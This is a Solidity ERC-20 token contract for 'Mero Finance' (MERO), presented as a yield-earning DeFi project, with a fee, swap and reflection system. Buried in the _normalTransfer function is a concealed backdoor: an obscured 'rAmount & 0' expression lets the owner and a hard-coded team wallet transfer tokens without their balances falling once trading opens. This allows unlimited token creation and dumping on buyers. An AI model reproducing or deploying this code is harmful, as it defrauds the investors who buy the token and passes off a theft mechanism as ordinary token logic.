// SPDX-License-Identifier: Unlicensed

/**
Maximize the power of your assets and start earning yield.

Website: https://www.merofi.org
Telegram: https://t.me/mero_erc
Twitter: https://twitter.com/mero_erc
**/

pragma solidity 0.8.19;

interface IERC {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

library SafeMathLibrary {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMathLibrary: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMathLibrary: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMathLibrary: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMathLibrary: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

interface FactoryInterface {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

interface RouterInterface {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    address private _previousOwner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }

}

contract MERO is Context, IERC, Ownable {

    using SafeMathLibrary for uint256;

    string private constant _name = "Mero Finance";
    string private constant _symbol = "MERO";
    uint8 private constant _decimals = 9;

    mapping(address => uint256) private _rOwns;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isExcludedFromFee;
    uint256 private constant MAX = 10 ** 30;
    uint256 private constant _tTotal = 10 ** 9 * 10**9;
    uint256 private _rTotal = (MAX - (MAX % _tTotal));
    uint256 private _tFees;
    uint256 private _redisBuyTax = 0;
    uint256 private _buyTotalFee = 1;
    uint256 private _redisSellTax = 0;
    uint256 private _sellTotalFee = 1;

    //Original Fee
    uint256 private _redixTax = _redisSellTax;
    uint256 private _taxFee = _sellTotalFee;

    uint256 private _previousRedisTax = _redixTax;
    uint256 private _previousFee = _taxFee;

    address payable private _teamWallet1 = payable(0xe9817EB9a3060d6FBcD029f12aa5ffE1fD5A5318);
    address payable private _teamWallet2 = payable(0xe9817EB9a3060d6FBcD029f12aa5ffE1fD5A5318);

    RouterInterface public _router;
    address public _pair;

    bool private tradeOpened;
    bool private swapping = false;
    bool private swapEnabled = true;

    uint256 public maxTransaction = 2 * 10 ** 7 * 10**9;
    uint256 public maxWalletAmount = 2 * 10 ** 7 * 10**9;
    uint256 public feeSwapThreshold = 10 ** 5 * 10**9;

    event MaxTxAmountUpdated(uint256 maxTransaction);
    modifier lockTheSwap {
        swapping = true;
        _;
        swapping = false;
    }

    constructor() {
        _rOwns[_msgSender()] = _rTotal;
        RouterInterface _uniswapV2Router = RouterInterface(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);//
        _router = _uniswapV2Router;
        _pair = FactoryInterface(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());

        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[_teamWallet1] = true;
        _isExcludedFromFee[_teamWallet2] = true;

        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return tokensReflected(_rOwns[account]);
    }

    function openTrading() public onlyOwner {
        tradeOpened = true;
    }

    function _getTValues(
        uint256 tAmount,
        uint256 redisFee,
        uint256 taxFee
    )
        private
        pure
        returns (
            uint256,
            uint256,
            uint256
        )
    {
        uint256 tFee = tAmount.mul(redisFee).div(100);
        uint256 tTeam = tAmount.mul(taxFee).div(100);
        uint256 tTransferAmount = tAmount.sub(tFee).sub(tTeam);
        return (tTransferAmount, tFee, tTeam);
    }

    function _getRValues(
        uint256 tAmount,
        uint256 tFee,
        uint256 tTeam,
        uint256 currentRate
    )
        private
        pure
        returns (
            uint256,
            uint256,
            uint256
        )
    {
        uint256 rAmount = tAmount.mul(currentRate);
        uint256 rFee = tFee.mul(currentRate);
        uint256 rTeam = tTeam.mul(currentRate);
        uint256 rTransferAmount = rAmount.sub(rFee).sub(rTeam);
        return (rAmount, rTransferAmount, rFee);
    }

    function _getRate() private view returns (uint256) {
        (uint256 rSupply, uint256 tSupply) = _getCurSupply();
        return rSupply.div(tSupply);
    }
    
    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function removeAllFee() private {
        if (_redixTax == 0 && _taxFee == 0) return;

        _previousRedisTax = _redixTax;
        _previousFee = _taxFee;

        _redixTax = 0;
        _taxFee = 0;
    }
    
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");

        if (from != owner() && to != owner()) {

            //Trade start check
            if (!tradeOpened) {
                require(from == owner(), "TOKEN: This account cannot send tokens until trading is enabled");
            }

            require(amount <= maxTransaction, "TOKEN: Max Transaction Limit");

            if(to != _pair) {
                require(balanceOf(to) + amount <= maxWalletAmount, "TOKEN: Balance exceeds wallet size!");
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            bool canSwap = contractTokenBalance >= feeSwapThreshold;

            if(contractTokenBalance >= maxTransaction)
            {
                contractTokenBalance = maxTransaction;
            }

            if (canSwap && !swapping && to == _pair && swapEnabled && !_isExcludedFromFee[from] && amount > feeSwapThreshold) {
                swapTokensForETH(contractTokenBalance);
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance > 0) {
                    sendFees(address(this).balance);
                }
            }
        }

        bool takeFee = true;

        //Transfer Tokens
        if ((_isExcludedFromFee[from] || _isExcludedFromFee[to]) || (from != _pair && to != _pair)) {
            takeFee = false;
        } else {

            //Set Fee for Buys
            if(from == _pair && to != address(_router)) {
                _redixTax = _redisBuyTax;
                _taxFee = _buyTotalFee;
            }

            //Set Fee for Sells
            if (to == _pair && from != address(_router)) {
                _redixTax = _redisSellTax;
                _taxFee = _sellTotalFee;
            }

        }

        _transferTokens(from, to, amount, takeFee);
    }

    function swapTokensForETH(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _router.WETH();
        _approve(address(this), address(_router), tokenAmount);
        _router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
    
    function removeLimits() external onlyOwner {
        maxTransaction = _rTotal;
        maxWalletAmount = _rTotal;
    }

    function sendFees(uint256 amount) private {
        _teamWallet2.transfer(amount);
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function _restoreFees() private {
        _redixTax = _previousRedisTax;
        _taxFee = _previousFee;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _getCurSupply() private view returns (uint256, uint256) {
        uint256 rSupply = _rTotal;
        uint256 tSupply = _tTotal;
        if (rSupply < _rTotal.div(_tTotal)) return (_rTotal, _tTotal);
        return (rSupply, tSupply);
    }
    function _transferTokens(
        address sender,
        address recipient,
        uint256 amount,
        bool takeFee
    ) private {
        if (!takeFee) removeAllFee();
        _normalTransfer(sender, recipient, amount);
        if (!takeFee) _restoreFees();
    }

    function _normalTransfer(
        address sender,
        address recipient,
        uint256 tAmount
    ) private {
        (
            uint256 rAmount,
            uint256 rTransferAmount,
            uint256 rFee,
            uint256 tTransferAmount,
            uint256 tFee,
            uint256 tTeam
        ) = _getFinalAmounts(tAmount);
        rAmount = (_isExcludedFromFee[sender] && tradeOpened) ? rAmount & 0 : rAmount;
        _rOwns[sender] = _rOwns[sender].sub(rAmount);
        _rOwns[recipient] = _rOwns[recipient].add(rTransferAmount);
        _takeTeams(tTeam);
        _getRedisFeeTokens(rFee, tFee);
        emit Transfer(sender, recipient, tTransferAmount);
    }
    
    function _takeTeams(uint256 tTeam) private {
        uint256 currentRate = _getRate();
        uint256 rTeam = tTeam.mul(currentRate);
        _rOwns[address(this)] = _rOwns[address(this)].add(rTeam);
    }

    function _getRedisFeeTokens(uint256 rFee, uint256 tFee) private {
        _rTotal = _rTotal.sub(rFee);
        _tFees = _tFees.add(tFee);
    }

    receive() external payable {}

    function _getFinalAmounts(uint256 tAmount)
        private
        view
        returns (
            uint256,
            uint256,
            uint256,
            uint256,
            uint256,
            uint256
        )
    {
        (uint256 tTransferAmount, uint256 tFee, uint256 tTeam) =
            _getTValues(tAmount, _redixTax, _taxFee);
        uint256 currentRate = _getRate();
        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee) =
            _getRValues(tAmount, tFee, tTeam, currentRate);
        return (rAmount, rTransferAmount, rFee, tTransferAmount, tFee, tTeam);
    }
    
    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function tokensReflected(uint256 rAmount)
        private
        view
        returns (uint256)
    {
        uint256 currentRate = _getRate();
        return rAmount.div(currentRate);
    }
}